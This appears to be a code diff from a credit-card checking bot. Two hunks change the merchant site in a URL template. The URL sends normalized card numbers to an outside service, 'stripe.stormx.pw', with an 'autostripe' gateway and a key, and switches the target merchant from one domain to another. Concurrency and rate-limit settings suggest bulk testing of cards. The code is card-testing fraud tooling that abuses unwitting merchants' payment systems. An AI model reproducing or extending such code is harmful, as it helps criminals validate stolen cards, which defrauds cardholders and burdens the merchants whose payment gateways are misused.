@@ -1942,7 +1942,7 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
         # Call main API
         api_url = (
             "https://stripe.stormx.pw/"
-            f"gateway=autostripe/key=darkboy/site=shebrews.org/cc={cc_normalized}"
+            f"gateway=autostripe/key=darkboy/site=funkybears.net/cc={cc_normalized}"
         )
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=55) as resp:
@@ -2847,7 +2847,7 @@ from db import get_user, update_user
 # --- SETTINGS ---
 API_URL_TEMPLATE = (
     "https://stripe.stormx.pw/"
-    "gateway=autostripe/key=darkboy/site=shebrews.org/cc="
+    "gateway=autostripe/key=darkboy/site=funkybears.net/cc="
 )
 CONCURRENCY = 3
 RATE_LIMIT_SECONDS = 5
